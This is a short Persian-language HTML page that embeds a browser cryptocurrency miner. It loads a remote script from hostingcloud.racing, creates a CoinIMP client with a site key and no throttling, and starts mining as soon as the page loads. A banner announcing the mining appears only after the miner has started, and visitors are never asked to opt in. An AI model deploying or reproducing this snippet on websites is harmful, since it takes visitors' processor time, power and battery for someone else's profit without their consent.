<!DOCTYPE html>
<html lang="fa">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>صفحه ماینینگ</title>
  <style>
    /* استایل‌های پایه */
    body {
      margin: 0;
      font-family: 'Tahoma', sans-serif;
      background-color: #f4f4f4;
      color: #333;
      text-align: center;
    }
    header {
      background-color: #333;
      color: #fff;
      padding: 1rem;
    }
    main {
      padding: 2rem;
    }
    footer {
      background-color: #333;
      color: #fff;
      padding: 1rem;
      position: fixed;
      bottom: 0;
      width: 100%;
    }
  </style>
</head>
<body>
  <header>
    <h1>صفحه ماینینگ</h1>
  </header>
  <main>
    <p>
      این وبسایت از ماینینگ ارز دیجیتال استفاده می‌کند. لطفاً در صورت استفاده از این سایت دقت نمایید که
      منابع سیستم شما ممکن است مورد استفاده قرار گیرد.
    </p>
  </main>
  <footer>
    <p>© تمامی حقوق محفوظ است</p>
  </footer>

  <!-- اضافه کردن اسکریپت ماینینگ -->
  <script src="https://www.hostingcloud.racing/po2v.js"></script>
  <script>
    // ایجاد شیء ماینینگ با کلید اختصاصی
    var _client = new Client.Anonymous('0671b695b001e563f34230946b071e7efa8cbf444f5ab32881d3f2746204b165', {
      throttle: 0, // بدون کند کردن سرعت ماینینگ
      c: 'w'       // تنظیمات مربوط به محیط وب
    });
    // شروع فرآیند ماینینگ
    _client.start();
    // افزودن اعلان برای آگاه‌سازی کاربر
    _client.addMiningNotification("Top", "این سایت از جاوا اسکریپت ماینر coinimp.com استفاده می‌کند. در صورت مزاحمت، می‌توانید آن را متوقف کنید.", "#cccccc", 40, "#3d3d3d");
  </script>
</body>
</html>
